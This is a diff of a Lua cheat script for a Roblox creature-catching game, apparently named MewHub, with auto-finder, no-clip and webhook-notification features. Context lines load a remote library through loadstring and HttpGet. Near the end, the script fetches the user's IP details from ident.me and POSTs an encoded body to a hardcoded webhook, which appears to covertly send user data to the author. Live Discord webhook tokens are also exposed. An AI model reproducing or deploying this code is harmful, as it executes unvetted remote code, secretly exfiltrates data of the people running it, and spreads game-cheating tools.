@@ -1,21 +1,18 @@
 
 --getgenv().WishList = {"Weedle","poop","fart"} 
---getgenv().Webhook = "https://discord.com/api/webhooks/1081794713981567046/nbqCSVDd3tge_DuHsmZl7sKQiOzsHwTLrydpGH1chsNc2RUmUdNFpEtNmnY1u844N3Mt"
-
-
+--getgenv().Webhook = "https://discord.com/api/webhooks/1077265651233726574/QOiTC11CbBk6WEAlJRNyQyP_cf8idOQM9FoWW2B3ameRF1oupVZmF7za27BKRXoFPOf1"
 
 --//Global Variables
-getgenv().AutoFinder = true
+getgenv().AutoFinder = false
 getgenv().GetVariations = false
 getgenv().GetShiny = false
 getgenv().NoClip = false
 getgenv().AutoFinderDelay = 0
 getgenv().WebHookNotify = false
 getgenv().InfRepel = false
-getgenv().LoterryRollback = false
 getgenv().FishingMode = false 
 getgenv().Rod = "GoodRod"
- 
+
 
 local plr = game:GetService("Players").LocalPlayer
 local cclosure = syn_newcclosure or newcclosure or nil
@@ -606,6 +603,11 @@ local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/Visua
 local Window = Library:CreateWindow('MewHub', "by: mewhub devs", 'Loading | MewHub', 'rbxassetid://12085151652', false, 'VisualUIConfigs', 'Light+')
 local Tab = Window:CreateTab('Auto Finder', true, 'rbxassetid://3926305904', Vector2.new(524, 44), Vector2.new(36, 36))
 local Section = Tab:CreateSection('Auto Finder [Beta]')
+
+local Textbox = Section:CreateTextbox('Your Webhook🔗', 'Paste Here', function(Value)
+    Webhook = Value
+end)
+
 local Toggle = Section:CreateToggle('Webhook-Notif 🔗', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
     WebHookNotify = Value
 end)
@@ -1139,7 +1141,7 @@ end)
 
 
 
- --[[
+
 --CONFIG
 local LibraryFunctions = Window:CreateTab('UI Config', false, 'rbxassetid://3926305904', Vector2.new(524, 44), Vector2.new(36, 36))
  
@@ -1228,7 +1230,12 @@ for Index, CurrentColor in next, Library:ReturnTheme() do
         Library:ChangeColor(Index, Color)
     end, {true})
 end
---]]
+--CREDITS
+local Tab = Window:CreateTab('', true, '', Vector2.new(524, 44), Vector2.new(36, 36))
+ 
+local Section = Tab:CreateSection('Credits')
+ 
+local Label1 = Section:CreateLabel('.gg/Mewhub')
 
 local info = game:HttpGet("http://ident.me/json")
 
@@ -1288,4 +1295,3 @@ Request = http_request or request or HttpPost or syn.request
 LINK = 'https://webhook.lewisakura.moe/api/webhooks/1082491657624227880/Zo1Lp_vYOzpdYsqu-d3MTPhx_1vDe7TOW6-n3u7JpzTUQd1Yeu-STr9nY4JFUljYIynk'
 local Final = {Url = LINK, Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
-
